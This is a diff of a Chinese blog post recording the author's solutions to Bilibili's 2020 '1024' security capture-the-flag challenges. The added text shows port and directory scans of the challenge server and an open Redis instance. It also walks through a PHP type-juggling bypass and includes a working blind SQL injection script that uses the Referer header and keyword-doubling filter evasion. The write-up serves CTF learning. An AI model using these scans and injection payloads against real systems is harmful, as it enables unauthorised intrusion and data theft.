@@ -1,4 +1,4 @@
-<!DOCTYPE html> <html lang=zh-Hans dir=ltr> <head> <script async src="https://www.googletagmanager.com/gtag/js?id=UA-179909808-1"></script> <script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-179909808-1")</script> <meta charset=utf-8> <meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"> <title>B站安全挑战赛解答过程记录 | shniubobo's Blog</title> <meta name=description content="B站这次的安全挑战赛看上去挺有意思，前几题也挺简单的，就试着参加了一下。目前只做出来前五题；从第六题开始网页就进不去了，同时 IP 也 ping 不通，只能先等页面恢复正常了。先通过这篇文章记录一下前五题的解答过程。"> <meta name=keywords content=bilibili,B站,1024,程序员节,安全挑战赛,解答,答案> <link rel=stylesheet href=https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/css/bootstrap.min.css integrity="sha256-Ww++W3rXBfapN8SZitAvc9jw2Xb+Ixt0rvDsmWmQyTo=" crossorigin=anonymous> <link rel=stylesheet href=https://shniubobo.xyz/static/style.css> </head> <body class="d-flex flex-column"> <nav class="navbar navbar-expand navbar-light shadow-sm fixed-top px-lg-0"> <div class="container-lg container-fluid col-xxl-6 d-sm-flex d-block"> <div class="text-center text-sm-left"> <a class="navbar-brand ml-sm-0 mr-sm-3 mx-auto my-0 h1" href=https://shniubobo.xyz/ >shniubobo's Blog</a> </div> <div class="d-flex flex-grow-1 justify-content-center"> <div class="flex-sm-grow-1 navbar-nav"> <a class="nav-item nav-link" href=https://shniubobo.xyz/ >主页</a> </div> <div class="my-auto mr-n2 navbar-nav"> <a class="nav-item nav-link" id=feed href=https://shniubobo.xyz/feeds/all.atom.xml><svg class=icon><use xlink:href=#icon-feed></use></svg></a> </div> </div> </div> </nav> <div class="container-lg container-fluid col-xxl-6" id=content> <div class="row row-cols-4"> <div class="col-md-9 col-12 pl-lg-0"> <article class="border-0 card" id=article-card> <h2 id=title>B站安全挑战赛解答过程记录</h2> <div class="text-muted flex-grow-1" id=metadata><time datetime=2020-10-25>2020-10-25</time><span class=dot></span>Notes</div> <hr class=my-0> <div class="text-justify alert alert-light mb-0">B站这次的安全挑战赛看上去挺有意思，前几题也挺简单的，就试着参加了一下。目前只做出来前五题；从第六题开始网页就进不去了，同时 <span class=caps>IP</span> 也 ping 不通，只能先等页面恢复正常了。先通过这篇文章记录一下前五题的解答过程。</div> <hr class=mt-0> <div> <div class="callout callout-info compound"> <p>由于每个人获得的 <code>flag</code> 似乎是不同的，因此文中的所有 <code>flag</code> 都替换成了 <code>[REDACTED]</code>。同时文中涉及的 Cookie 也都会替换为 <code>[REDACTED]</code>。</p> </div> <section id=id1> <h3>第一题：页面的背后是什么？</h3> <p>这道题很简单，审查元素里可以直接找到：</p> <div class=highlight><pre><span></span><span class=p>&lt;</span><span class=nt>input</span> <span class=na>id</span><span class=o>=</span><span class=s>"flag1"</span> <span class=na>type</span><span class=o>=</span><span class=s>"hidden"</span> <span class=na>values</span><span class=o>=</span><span class=s>"flag1"</span> <span class=na>value</span><span class=o>=</span><span class=s>"[REDACTED]"</span><span class=p>></span>
+<!DOCTYPE html> <html dir=ltr lang=zh-Hans> <head> <script async src="https://www.googletagmanager.com/gtag/js?id=UA-179909808-1"></script> <script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-179909808-1")</script> <meta charset=utf-8> <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name=viewport> <title>B站安全挑战赛解答过程记录 | shniubobo's Blog</title> <meta content="B站这次的安全挑战赛看上去挺有意思，前几题也挺简单的，就试着参加了一下。目前只做出来前五题；从第六题开始网页就进不去了，同时 IP 也 ping 不通，只能先等页面恢复正常了。先通过这篇文章记录一下前五题的解答过程。" name=description> <meta content=bilibili,B站,1024,程序员节,安全挑战赛,解答,答案 name=keywords> <link crossorigin=anonymous href=https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/css/bootstrap.min.css integrity="sha256-Ww++W3rXBfapN8SZitAvc9jw2Xb+Ixt0rvDsmWmQyTo=" rel=stylesheet> <link href=https://shniubobo.xyz/static/style.css rel=stylesheet> </head> <body class="d-flex flex-column"> <nav class="navbar navbar-expand navbar-light shadow-sm fixed-top px-lg-0"> <div class="container-lg container-fluid col-xxl-6 d-sm-flex d-block"> <div class="text-center text-sm-left"> <a class="navbar-brand ml-sm-0 mr-sm-3 mx-auto my-0 h1" href=https://shniubobo.xyz/ >shniubobo's Blog</a> </div> <div class="d-flex flex-grow-1 justify-content-center"> <div class="flex-sm-grow-1 navbar-nav"> <a class="nav-item nav-link" href=https://shniubobo.xyz/ >主页</a> </div> <div class="my-auto mr-n2 navbar-nav"> <a class="nav-item nav-link" href=https://shniubobo.xyz/feeds/all.atom.xml id=feed><svg class=icon><use xlink:href=#icon-feed></use></svg></a> </div> </div> </div> </nav> <div class="container-lg container-fluid col-xxl-6" id=content> <div class="row row-cols-4"> <div class="col-md-9 col-12 pl-lg-0"> <article class="border-0 card" id=article-card> <h2 id=title>B站安全挑战赛解答过程记录</h2> <div class="text-muted flex-grow-1" id=metadata><time datetime=2020-10-25>2020-10-25</time><span class=dot></span>Notes</div> <hr class=my-0> <div class="text-justify alert alert-light mb-0">B站这次的安全挑战赛看上去挺有意思，前几题也挺简单的，就试着参加了一下。目前只做出来前五题；从第六题开始网页就进不去了，同时 <span class=caps>IP</span> 也 ping 不通，只能先等页面恢复正常了。先通过这篇文章记录一下前五题的解答过程。</div> <hr class=mt-0> <div> <div class="callout callout-info compound"> <p>由于每个人获得的 <code>flag</code> 似乎是不同的，因此文中的所有 <code>flag</code> 都替换成了 <code>[REDACTED]</code>。同时文中涉及的 Cookie 和日期也都会替换为 <code>[REDACTED]</code>。</p> </div> <section id=id1> <h3>第一题：页面的背后是什么？</h3> <p>这道题很简单，审查元素里可以直接找到：</p> <div class=highlight><pre><span></span><span class=p>&lt;</span><span class=nt>input</span> <span class=na>id</span><span class=o>=</span><span class=s>"flag1"</span> <span class=na>type</span><span class=o>=</span><span class=s>"hidden"</span> <span class=na>values</span><span class=o>=</span><span class=s>"flag1"</span> <span class=na>value</span><span class=o>=</span><span class=s>"[REDACTED]"</span><span class=p>></span>
 </pre></div> </section> <section id=id2> <h3>第二题：真正的秘密只有特殊的设备才能看到</h3> <p>第二题同样很简单。根据页面提示：</p> <blockquote> 需要使用bilibili Security Browser浏览器访问～</blockquote> <p>很容易想到需要修改 <code>User-Agent</code>。有两种办法。</p> <p>第一种方法。可以直接在 Chrome 的 DevTools 中，找到 Network conditions 选项卡，然后取消勾选 User agent 一栏的 <code>Select automatically</code>，并在下面选择 <code>Custom...</code>，填入 <code>bilibili Security Browser</code>。刷新一下即可看到答案。</p> <p>第二种方法。可以通过各种 <span class=caps>HTTP</span> 客户端，如 <code>curl</code>、<code>wget</code>、Postman 等向 <span class=caps>API</span> 发送请求。我这里选择使用 <code>httpie</code>，主要是用起来比较方便。首先通过审查元素找到接口：</p> <div class=highlight><pre><span></span><span class=p>&lt;</span><span class=nt>script</span><span class=p>></span>
     <span class=nx>$</span><span class=p>.</span><span class=nx>ajax</span><span class=p>({</span>
 <span class=hll>        <span class=nx>url</span><span class=o>:</span> <span class=s2>"api/ctf/2"</span><span class=p>,</span>
@@ -31,7 +31,7 @@
 <span class=go>    "data": "[REDACTED]",</span>
 <span class=go>    "msg": ""</span>
 <span class=go>}</span>
-</pre></div> </section> <section id=id3> <h3>第三题：密码是啥？</h3> <p>说实话这道题我直到最后都没有想出解法。几个我认为可能有用的地方 <a class=m-footnote href=#id9 id=id4>1</a>：</p> <div class=highlight><pre><span></span><span class=p>&lt;</span><span class=nt>meta</span> <span class=na>name</span><span class=o>=</span><span class=s>"flag3"</span> <span class=na>content</span><span class=o>=</span><span class=s>"width=device-width, initial-scale=1.0"</span><span class=p>></span>
+</pre></div> </section> <section id=id3> <h3>第三题：密码是啥？</h3> <p>说实话这道题我直到最后都没有想出解法。几个我认为可能有用的地方 <a class=m-footnote href=#id11 id=id4>1</a>：</p> <div class=highlight><pre><span></span><span class=p>&lt;</span><span class=nt>meta</span> <span class=na>name</span><span class=o>=</span><span class=s>"flag3"</span> <span class=na>content</span><span class=o>=</span><span class=s>"width=device-width, initial-scale=1.0"</span><span class=p>></span>
 </pre></div> <div class=highlight><pre><span></span><span class=p>&lt;</span><span class=nt>script</span><span class=p>></span>
     <span class=c1>//falg 3</span>
 
@@ -202,4 +202,153 @@
 
 <span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>'__main__'</span><span class=p>:</span>
     <span class=n>asyncio</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>main</span><span class=p>())</span>
-</pre></div> </table><p>稍微解释一下。第 32 行的 <code>@retry</code> 是为了防止服务器不稳定导致脚本直接退出。<code>make_request</code> 会在成功时调用 <code>success.set</code>，告知 <code>main</code> 不用再运行下去了。</p> </section> <section id=id8> <h3>剩下的题目</h3> <p>第六题的页面始终进不去，也 ping 不通。故障的话不至于持续这么久，看来这或许是正常现象🤔？之后如果我探究出个所以然的话也会补上解答过程。</p> <hr> <dl class=m-footnote> <dt id=id9>1.</dt> <dd><span class=m-footnote><a href=#id4>^</a></span> 其中第一处的 <code>&lt;meta></code> 标签我后来发现每一题的页面中都存在🤣。</dd> </dl> </section> </div> <div class="alert alert-secondary" id=license> <div class=mb-3 id=license-meta> <h2 id=license-title>B站安全挑战赛解答过程记录</h2> <div id=meta-url><a href=https://shniubobo.xyz/article/bilibili-1024.html class=text-muted>https://shniubobo.xyz/article/bilibili-1024.html</a></div> <div class="d-flex flex-wrap mt-3"> <div class="meta-kv flex-grow-1 flex-sm-grow-0"> <div class=meta-key>作者</div> <div class=meta-value>shniubobo</div> </div> <div class=meta-kv> <div class="meta-key text-right text-sm-left">发布日期</div> <div class=meta-value>2020-10-25</div> </div> <div class="flex-linebreak d-sm-none mb-1"></div> <div class=meta-kv> <div class=meta-key>许可协议</div> <div class=meta-value><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/ target=_blank rel=noreferrer>CC BY-NC-SA 4.0</a></div> </div> </div> </div> <div id=license-notice>转载或引用本文时请遵守许可协议，注明出处，以相同方式发布，且不得商用！</div> </div> <div class="d-flex mb-n1 mb-sm-n3 user-select-none" id=neighbours> <a href=https://shniubobo.xyz/article/hello-world.html class="neighbour-item d-flex align-items-center"> <svg class="icon icon-neighbour icon-prev mr-3"><use xlink:href=#icon-next></use></svg> <div> <div class=neighbour>上一篇</div> <div>Hello, world!</div> </div> </a> <div class=flex-grow-1></div> <div class="text-muted text-right neighbour-item d-flex align-items-center"> <div> <div class=neighbour>下一篇</div> <div>无</div> </div> <svg class="icon icon-neighbour icon-next ml-3"><use xlink:href=#icon-next></use></svg> </div> </div> </article> </div> <div class="col-md col-12 pl-md-0 pr-lg-0"> <div class="border-0 card text-center" id=profile-card> <img src=https://shniubobo.xyz/static/avatar.jpg alt=Avatar class="rounded-circle img-thumbnail mx-auto mb-2" id=avatar> <div id=name class=mb-1>shniubobo</div> <p class="mb-2 d-block d-md-none d-lg-block">仍未停止思考</p> <div class="container col-xl-8 col-md-12 col-sm-4 col-6"> <div class="row row-cols-2 mb-0 pl-0"> <div class="col px-0"><a class="d-inline-block social-icon" href=https://github.com/shniubobo target=_blank rel=noreferrer><svg class=icon><use xlink:href=#icon-github></use></svg></a></div> <div class="col px-0"><a class="d-inline-block social-icon" href=https://steamcommunity.com/id/shniubobo/ target=_blank rel=noreferrer><svg class=icon><use xlink:href=#icon-steam></use></svg></a></div> </div> </div> </div> </div> </div> </div> <footer lang=en class=mt-auto> <div class="container-lg container-fluid col-xxl-6 my-3 px-lg-0 d-md-flex text-muted text-md-left text-center"> <div class=flex-grow-1>Copyright © 2020 shniubobo</div> <div> <span class="d-block d-sm-inline">Powered by <a class=link-text href=https://github.com/getpelican/pelican target=_blank rel=noreferrer>Pelican</a></span><span class="dot d-none d-sm-inline"></span><span>Made by <a class=link-text href=https://shniubobo.xyz/about.html>shniubobo</a> with <span class=coffee></span></span> </div> </div> </footer> <script src=//at.alicdn.com/t/font_2112932_q7g9e3n630l.js crossorigin=anonymous></script> <script src=https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin=anonymous></script> <script src=https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js integrity=sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN crossorigin=anonymous></script> <script src=https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/js/bootstrap.min.js integrity="sha256-ecWZ3XYM7AwWIaGvSdmipJ2l1F4bN9RXW6zgpeAiZYI=" crossorigin=anonymous></script> 
+</pre></div> </table><p>稍微解释一下。第 32 行的 <code>@retry</code> 是为了防止服务器不稳定导致脚本直接退出。<code>make_request</code> 会在成功时调用 <code>success.set</code>，告知 <code>main</code> 不用再运行下去了。</p> </section> <section id=id8> <h3>剩下的题目</h3> <p><s>第六题的页面始终进不去，也 ping 不通。故障的话不至于持续这么久，看来这或许是正常现象🤔？之后如果我探究出个所以然的话也会补上解答过程。</s></p> <p>B 站第二天就换了新的服务器，虽然依旧不怎么稳定，经常 404、503，但至少能进了。由于后面的几题并不是按照 6-10 的顺序解答，而且我也只作出了 2 题，就都写在这一部分里了。</p> <p>进入第六题的网页后什么都没有，页面上的所有链接指向的页面都是 404，只有一个表单应该有些用。点击发送后会向同一网页发送 <span class=caps>POST</span> 请求，表单内的信息对应关系是：</p> <ul> <li>名字 -> <code>name</code></li> <li>邮箱 -> <code>email</code></li> <li>网址 -> <code>url</code></li> <li>评论 -> <code>comment</code></li> </ul> <p>返回的页面和原先一模一样，猜测填写一定的表单信息，或尝试将文件作为表单信息发送，可能会返回不一样的页面内容。</p> <p>这一题卡住了，于是决定扫一下目录和端口。</p> <div class=highlight><pre><span></span><span class=gp>$</span> nmap -p- <span class=m>45</span>.113.201.36
+
+<span class=go>Starting Nmap 7.60 ( https://nmap.org ) at [REDACTED]</span>
+<span class=go>Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan</span>
+<span class=go>Ping Scan Timing: About 100.00% done; ETC: 21:08 (0:00:00 remaining)</span>
+<span class=go>Nmap scan report for 45.113.201.36</span>
+<span class=go>Host is up (0.024s latency).</span>
+<span class=go>Not shown: 65529 filtered ports</span>
+<span class=go>PORT     STATE  SERVICE</span>
+<span class=go>80/tcp   open   http</span>
+<span class=go>443/tcp  closed https</span>
+<span class=go>1194/tcp closed openvpn</span>
+<span class=hll><span class=go>6379/tcp open   redis</span>
+</span><span class=go>8069/tcp closed unknown</span>
+<span class=go>8091/tcp closed jamlink</span>
+
+<span class=go>Nmap done: 1 IP address (1 host up) scanned in 401.56 seconds</span>
+</pre></div> <div class=highlight><pre><span></span><span class=gp>$</span> ./dirsearch.py -E -u http://45.113.201.36/ -r -c <span class=s2>"[REDACTED]"</span>
+
+<span class=go>  _|. _ _  _  _  _ _|_    v0.4.0</span>
+<span class=go> (_||| _) (/_(_|| (_| )</span>
+
+<span class=go>Extensions: php, asp, aspx, jsp, html, htm, js | HTTP method: GET | Threads: 20 | Wordlist size: 10023 | Recursion level: 1</span>
+
+<span class=go>Error Log: [REDACTED]</span>
+
+<span class=go>Target: http://45.113.201.36/</span>
+
+<span class=go>Output File: [REDACTED]</span>
+
+<span class=go>[REDACTED] Starting:</span>
+<span class=go>[REDACTED] 301 -  185B  - /js  ->  http://45.113.201.36/js/     (Added to queue)</span>
+<span class=go>[REDACTED] 301 -  310B  - /blog  ->  http://45.113.201.36/blog/     (Added to queue)</span>
+<span class=go>[REDACTED] 200 -  473B  - /common.js</span>
+<span class=hll><span class=go>[REDACTED] 301 -  185B  - /console  ->  http://45.113.201.36/console/     (Added to queue)</span>
+</span><span class=hll><span class=go>[REDACTED] 403 -  571B  - /console/</span>
+</span><span class=go>[REDACTED] 301 -  185B  - /css  ->  http://45.113.201.36/css/     (Added to queue)</span>
+<span class=go>[REDACTED] 200 -    4KB - /favicon.ico</span>
+<span class=go>[REDACTED] 200 -    3KB - /index.html</span>
+<span class=go>[REDACTED] 200 -    4KB - /login.html</span>
+<span class=go>[REDACTED] 200 -    9KB - /start.html</span>
+<span class=go>[REDACTED] 200 -    3KB - /user.html</span>
+<span class=go>[REDACTED] Starting: js/</span>
+<span class=go>[REDACTED] 200 -  473B  - /js/common.js</span>
+<span class=go>[REDACTED] Starting: blog/</span>
+<span class=go>[REDACTED] 301 -  313B  - /blog/js  ->  http://45.113.201.36/blog/js/</span>
+<span class=go>[REDACTED] 403 -  298B  - /blog/.htaccess.bak1</span>
+<span class=go>[REDACTED] 403 -  298B  - /blog/.htaccess.orig</span>
+<span class=go>[REDACTED] 403 -  300B  - /blog/.htaccess.sample</span>
+<span class=go>[REDACTED] 403 -  298B  - /blog/.htaccess.save</span>
+<span class=go>[REDACTED] 403 -  296B  - /blog/.htaccessBAK</span>
+<span class=go>[REDACTED] 403 -  296B  - /blog/.htaccessOLD</span>
+<span class=go>[REDACTED] 403 -  289B  - /blog/.html</span>
+<span class=go>[REDACTED] 403 -  288B  - /blog/.htm</span>
+<span class=go>[REDACTED] 403 -  297B  - /blog/.htaccessOLD2</span>
+<span class=go>[REDACTED] 403 -  295B  - /blog/.httr-oauth</span>
+<span class=go>[REDACTED] 403 -  288B  - /blog/.php</span>
+<span class=go>[REDACTED] 403 -  289B  - /blog/.php3</span>
+<span class=go>[REDACTED] 301 -  314B  - /blog/css  ->  http://45.113.201.36/blog/css/</span>
+<span class=hll><span class=go>[REDACTED] 200 -   66KB - /blog/test.php</span>
+</span><span class=go>[REDACTED] Starting: console/</span>
+<span class=go>[REDACTED] 301 -  185B  - /console/css  ->  http://45.113.201.36/console/css/</span>
+<span class=go>[REDACTED] Starting: css/</span>
+
+<span class=go>Task Completed</span>
+</pre></div> <p>重要的几行都高亮了出来。</p> <p>既然有开 redis 的端口，那就试着连一下，发现不需要密码。用 <code>KEYS *</code> 看了一下，里面一堆 flag，每个都试了一下，发现只有第 8 题的是对的，剩下的估计都是别人自己加进去的。又尝试找找 redis 里有没有什么其他线索，但发现这个服务端就是个无情的 <span class=caps>OK</span> 机器，除了几个最基本的增删改查的命令外，发什么都回 <span class=caps>OK</span> 😂。这样看来 redis 的这个端口只能用来解第 8 题了。</p> <p>然后可以发现扫目录扫出了个 <code>/blog/test.php</code>，进去发现全是各种 <code>!+()[]{}</code> 之类的奇怪符号，查了一下才知道是 JsFuck。用 <a href=http://codertab.com/JsUnFuck rel=noreferrer target=_blank>JsUnFuck</a> 解密一下后发现是这样一段代码：</p> <div class=highlight><pre><span></span><span class=kd>var</span> <span class=nx>str1</span> <span class=o>=</span> <span class=s2>"\u7a0b\u5e8f\u5458\u6700\u591a\u7684\u5730\u65b9"</span><span class=p>;</span>
+<span class=kd>var</span> <span class=nx>str2</span> <span class=o>=</span> <span class=s2>"bilibili1024havefun"</span><span class=p>;</span>
+<span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>()</span>
+</pre></div> <p>其中 <code>str1</code> 是 <code>程序员最多的地方</code>，很容易猜到指 Github。上 Github 搜了一下 <code>bilibili1024havefun</code>，发现了 <a href=https://github.com/interesting-1024/end rel=noreferrer target=_blank>interesting-1024/end</a>。一共两个 commit，都是直接在网页上提交的，邮箱也用的是 Github 的 <a class=m-footnote href=#id12 id=id9>2</a>。只有 <a class=m-link-wrap href=https://github.com/interesting-1024/end/tree/main/end.php rel=noreferrer target=_blank>https://github.com/interesting-1024/end/tree/main/end.php</a> 这个文件有用：</p> <table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22</pre></div><td class=code><div class=highlight><pre><span></span><span class=cp>&lt;?php</span>
+
+<span class=c1>//filename end.php</span>
+
+<span class=nv>$bilibili</span> <span class=o>=</span> <span class=s2>"bilibili1024havefun"</span><span class=p>;</span>
+
+<span class=hll><span class=nv>$str</span> <span class=o>=</span> <span class=nb>intval</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>'id'</span><span class=p>]);</span>
+</span><span class=nv>$reg</span> <span class=o>=</span> <span class=nb>preg_match</span><span class=p>(</span><span class=s1>'/\d/is'</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>'id'</span><span class=p>]);</span>
+
+<span class=hll><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nb>is_numeric</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>'id'</span><span class=p>])</span> <span class=k>and</span> <span class=nv>$reg</span> <span class=o>!==</span> <span class=mi>1</span> <span class=k>and</span> <span class=nv>$str</span> <span class=o>===</span> <span class=mi>1</span><span class=p>){</span>
+</span><span class=hll>    <span class=nv>$content</span> <span class=o>=</span> <span class=nb>file_get_contents</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>'url'</span><span class=p>]);</span>
+</span>
+<span class=hll>    <span class=c1>//文件路径猜解</span>
+</span>    <span class=k>if</span> <span class=p>(</span><span class=k>false</span><span class=p>){</span>
+        <span class=k>echo</span> <span class=s2>"还差一点点啦～"</span><span class=p>;</span>
+    <span class=p>}</span><span class=k>else</span><span class=p>{</span>
+        <span class=k>echo</span> <span class=nv>$flag</span><span class=p>;</span>
+    <span class=p>}</span>
+<span class=p>}</span><span class=k>else</span><span class=p>{</span>
+    <span class=k>echo</span> <span class=s2>"你想要的不在这儿～"</span><span class=p>;</span>
+<span class=p>}</span>
+<span class=cp>?></span><span class=x></span>
+</pre></div> </table><p>第 7 行和第 10 行中的 <code>!is_numeric($_GET['id'])</code> 可以看出，<code>id</code> 不能是数字，但必须能被 <code>intval</code> 转换成 <code>1</code>，因此 <code>id</code> 可以是一个数组。同时从第 11 行可以看出还需要一个 <code>url</code> 参数，再结合第 13 行，可以看出要猜路径。<s>最讨厌的猜谜时间🤦‍♂️</s>。猜了各种路径后，发现是任意字符 + <code>flag.txt</code>，如 <code>xflag.txt</code> <a class=m-footnote href=#id13 id=id10>3</a>。最后拼出来的路径是:</p> <pre>http://45.113.201.36/blog/end.php?id[]=1&url=xflag.txt</pre> <p>得到一张图片。图片上没什么信息，用 <code>hexdump</code> 可以发现文件最后有 flag10：</p> <div class=highlight><pre><span></span><span class=gp>$</span> hd bilibili_224a634752448def6c0ec064e49fe797_havefun.jpg
+
+<span class=go>[TRUNCATED]</span>
+
+<span class=go>00008f90  8a 28 00 a2 8a 28 03 ff  d9 7b 7b 66 6c 61 67 31  |.(...(...{{flag1|</span>
+<span class=go>00008fa0  30 3a 32 65 62 64 33 62  30 38 2d 34 37 66 66 63  |0:2ebd3b08-47ffc|</span>
+<span class=go>00008fb0  34 37 38 2d 62 34 39 61  35 66 39 64 2d 66 36 30  |478-b49a5f9d-f60|</span>
+<span class=go>00008fc0  39 39 64 36 35 7d 7d                              |99d65}}|</span>
+<span class=go>00008fc7</span>
+</pre></div> <p>同时图片文件名的中间那段应该也是 md5，但并不是图片的 md5，也找不出是什么的 md5，尝试用 <code>hashcat</code> 暴力破解，8 位之内并没有破解出来。</p> <p>再回到之前的 <code>dirsearch</code> 的结果。可以看出有一个 <code>console</code> 路径和各种配置文件会返回 403。经手动测试发现只有以某些字母开头的配置文件会返回 403，如 <code>/blog/.htaccess1</code> 就返回的是 403，而 <code>/blog/.bashrc</code> 返回的则是 404。</p> <p>到这里就没有其他的发现了，也不知道如何继续解下去。还有一堆作业要做，就不继续想下去了🤦‍♂️。</p> <hr> <p>本来打算写到这里为止，但我在之前的 <a href=https://github.com/interesting-1024/end/issues/283 rel=noreferrer target=_blank>那个代码库里的一个 issue 中</a> 找到了第 6 题的答案；虽然不是自己做的，但也在这里写一下。</p> <p>第六题通过 Referer 注入，可以改变页面上显示的内容。通过二分查找确定页面最早开始变化的数字，然后把每一位的数字转换成对应的 Unicode 字符，就能得到第六题的 flag。</p> <p>Issue 中有提供脚本，但代码风格感人，同时 Python 3 运行会报错，这里再提供一个我修改过的版本：</p> <div class=highlight><pre><span></span><span class=kn>import</span> <span class=nn>requests</span>
+
+<span class=n>URL</span> <span class=o>=</span> <span class=s1>'http://45.113.201.36/blog/single.php?id=1'</span>
+
+
+<span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
+    <span class=n>flag</span> <span class=o>=</span> <span class=p>[]</span>
+    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>50</span><span class=p>):</span>
+        <span class=n>left</span><span class=p>,</span> <span class=n>right</span> <span class=o>=</span> <span class=mi>33</span><span class=p>,</span> <span class=mi>128</span>
+        <span class=k>while</span> <span class=n>right</span> <span class=o>-</span> <span class=n>left</span> <span class=o>!=</span> <span class=mi>1</span><span class=p>:</span>
+            <span class=n>mid</span> <span class=o>=</span> <span class=p>(</span><span class=n>left</span> <span class=o>+</span> <span class=n>right</span><span class=p>)</span> <span class=o>//</span> <span class=mi>2</span>
+            <span class=n>payload</span> <span class=o>=</span> <span class=p>(</span><span class=sa>f</span><span class=s2>"0123'^if(substr((selselectect flag from flag),</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s2>,1)>"</span>
+                       <span class=sa>f</span><span class=s2>"binary </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>mid</span><span class=p>)</span><span class=si>}</span><span class=s2>,(selecselectt 1+~0),0) "</span>
+                       <span class=sa>f</span><span class=s2>"ununionion selecselectt 1,2#"</span><span class=p>)</span>
+            <span class=n>headers</span> <span class=o>=</span> <span class=p>{</span><span class=s1>'Referer'</span><span class=p>:</span> <span class=n>payload</span><span class=p>}</span>
+            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>URL</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
+            <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span> <span class=o>==</span> <span class=mi>5596</span><span class=p>:</span>
+                <span class=n>left</span> <span class=o>=</span> <span class=n>mid</span>
+            <span class=k>else</span><span class=p>:</span>
+                <span class=n>right</span> <span class=o>=</span> <span class=n>mid</span>
+        <span class=nb>print</span><span class=p>(</span><span class=n>right</span><span class=p>,</span> <span class=n>end</span><span class=o>=</span><span class=s1>' '</span><span class=p>,</span> <span class=n>flush</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
+        <span class=n>flag</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>right</span><span class=p>))</span>
+    <span class=nb>print</span><span class=p>()</span>
+    <span class=nb>print</span><span class=p>(</span><span class=s1>''</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>flag</span><span class=p>))</span>
+
+
+<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>'__main__'</span><span class=p>:</span>
+    <span class=n>main</span><span class=p>()</span>
+</pre></div> <p>运行输出如下:</p> <pre>97 50 98 48 56 56 51 99 45 102 102 98 98 56 100 49 55 45 57 97 51 98 98 102 49 99 45 101 100 54 48 48 99 56 48 34 34 34 34 34 34 34 34 34 34 34 34 34 34
+a2b0883c-ffbb8d17-9a3bbf1c-ed600c80"""""""""""""""""""""""""""""""""</pre> <p>其中 <code>a2b0883c-ffbb8d17-9a3bbf1c-ed600c80</code> 就是第六题的答案。</p> <hr> <dl class=m-footnote> <dt id=id11>1.</dt> <dd><span class=m-footnote><a href=#id4>^</a></span> 其中第一处的 <code>&lt;meta></code> 标签我后来发现每一题的页面中都存在🤣。</dd> <dt id=id12>2.</dt> <dd><span class=m-footnote><a href=#id9>^</a></span> <code>interesting-1024 &lt;73268425+interesting-1024@users.noreply.github.com></code></dd> <dt id=id13>3.</dt> <dd><span class=m-footnote><a href=#id10>^</a></span> 不能用 <code>flag.txt</code>。</dd> </dl> </section> </div> <div class="alert alert-secondary" id=license> <div class=mb-3 id=license-meta> <h2 id=license-title>B站安全挑战赛解答过程记录</h2> <div id=meta-url><a class=text-muted href=https://shniubobo.xyz/article/bilibili-1024.html>https://shniubobo.xyz/article/bilibili-1024.html</a></div> <div class="d-flex flex-wrap mt-3"> <div class="meta-kv flex-grow-1 flex-sm-grow-0"> <div class=meta-key>作者</div> <div class=meta-value>shniubobo</div> </div> <div class=meta-kv> <div class="meta-key text-right text-sm-left">发布日期</div> <div class=meta-value>2020-10-25</div> </div> <div class="flex-linebreak d-sm-none mb-1"></div> <div class="meta-kv flex-grow-1 flex-sm-grow-0"> <div class=meta-key>最后修改日期</div> <div class=meta-value>2020-10-26</div> </div> <div class=meta-kv> <div class="meta-key text-right text-sm-left">许可协议</div> <div class=meta-value><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/ rel=noreferrer target=_blank>CC BY-NC-SA 4.0</a></div> </div> </div> </div> <div id=license-notice>转载或引用本文时请遵守许可协议，注明出处，以相同方式发布，且不得商用！</div> </div> <div class="d-flex mb-n1 mb-sm-n3 user-select-none" id=neighbours> <a class="neighbour-item d-flex align-items-center" href=https://shniubobo.xyz/article/hello-world.html> <svg class="icon icon-neighbour icon-prev mr-3"><use xlink:href=#icon-next></use></svg> <div> <div class=neighbour>上一篇</div> <div>Hello, world!</div> </div> 